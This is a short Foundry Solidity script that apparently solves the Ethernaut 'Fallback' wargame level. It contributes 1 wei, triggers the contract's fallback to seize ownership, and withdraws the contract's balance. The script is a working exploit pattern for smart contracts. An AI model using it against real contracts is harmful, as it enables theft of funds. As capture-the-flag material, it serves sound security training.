// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSol is Script {
    Fallback public fallback_ = Fallback(payable(0x0Eb3c1336478A663Bae0Bc33b27b06Cfb5c515a8));

    function run() external {
        vm.startBroadcast();

        fallback_.contribute{value: 1 wei}();
        console.log("My contribution: ", fallback_.getContribution());
        address(fallback_).call{value: 1 wei}("");
        console.log("After Contract owner: ", fallback_.owner());
        fallback_.withdraw();
        console.log("After Contract balance: ", address(fallback_).balance);

        vm.stopBroadcast();
    }
}